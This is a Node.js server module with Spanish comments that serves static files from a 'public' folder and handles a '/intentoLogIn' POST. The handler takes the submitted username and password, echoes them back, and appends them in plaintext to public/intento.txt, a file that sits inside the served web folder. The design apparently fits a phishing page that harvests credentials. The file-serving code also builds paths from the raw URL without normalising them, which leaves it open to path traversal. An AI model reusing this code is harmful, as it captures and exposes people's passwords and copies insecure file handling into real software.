
var http = require('http');

var url = require('url');

var fs = require('fs');

var querystring = require('querystring');

var servidor;

/*Archivos soportados en la transferencia*/
var mime = {
	'html': 'text/html',
	'css': 'text/css',
	'jpg': 'image/jpg',
	'ico': 'image/x-icon',
	'mp3': 'audio/mpeg3',
	'mp4': 'video/mp4'
};

function configurarServidor() {
	servidor = http.createServer(function (entrada, respuesta) {
		var ruta = definirRuta(entrada);		
		switch(ruta){
			//si se mandaron los datos por POST
			case '/intentoLogIn':{
				grabarIntento(entrada, respuesta);
				break;
			}

			default:{
				//validamos si la pagina solicitada existe
				fs.exists(ruta, function (existe) {
					//si la encontro
					if(existe){
						cargarPagina(ruta, respuesta);
						//si no existe respondemos error 404
					}else{
						mostrarError(respuesta);
					}
				})
			}
		}
		
	});
}

function grabarIntento(entrada, respuesta){
	//contendra todos los datos
	var info = '';
	//se extraen los datos a medida que van llegando
	entrada.on('data', function(datosparciales){
		//se concatenan los datos en info
		info += datosparciales;
	});
	//cuando se reciben todos los datos se ejecuta el end
	entrada.on('end', function(){
		//se parsean los datos a json
		var datos = querystring.parse(info);
		respuesta.writeHead(200, {'Content-type': 'application/json'});
		var object = {usuario: datos['usuario'], password: datos['password']};

		object = JSON.stringify(object);

		respuesta.end(object);

		grabarEnArchivo(datos);
	});
}

function grabarEnArchivo(datos){
	var datos = 'Usuario:' + datos['usuario'] + 'Password:' + datos['password'] + '<hr>';

	fs.appendFile('public/intento.txt', datos, function (error) {
		if(error)
			console.log(error);
	});
}

function definirRuta(entrada){
	var objetourl = url.parse(entrada.url);

	var ruta = 'public' + objetourl.pathname;

	if(ruta === 'public/'){
		ruta = 'public/index.html';
	}
	return ruta;
}

function cargarPagina(ruta, respuesta){
	fs.readFile(ruta, function (error, contenidoArchivo) {
		if(error){
			respuesta.writeHead(500, {'Content-type': 'text/plain'});
			respuesta.write('Error interno');
			respuesta.end();
		}else{
			var vec = ruta.split('.');
			var extension = vec[vec.length - 1];
			var mimearchivo = mime[extension];

			respuesta.writeHead(200, {'Content-type': mimearchivo});
			respuesta.write(contenidoArchivo);
			respuesta.end();
		}
	});
}

function mostrarError(respuesta){
	respuesta.writeHead(404, {'Content-type': 'text/html'});
	respuesta.write('<!doctype html><html><head></head><body>Recurso Inexistente</body></html>');
	respuesta.end();
}

function iniciarServidor(){
	servidor.listen(8888);
	console.log('Servidor web iniciado');
}

exports.configurarServidor = configurarServidor;
exports.iniciarServidor = iniciarServidor;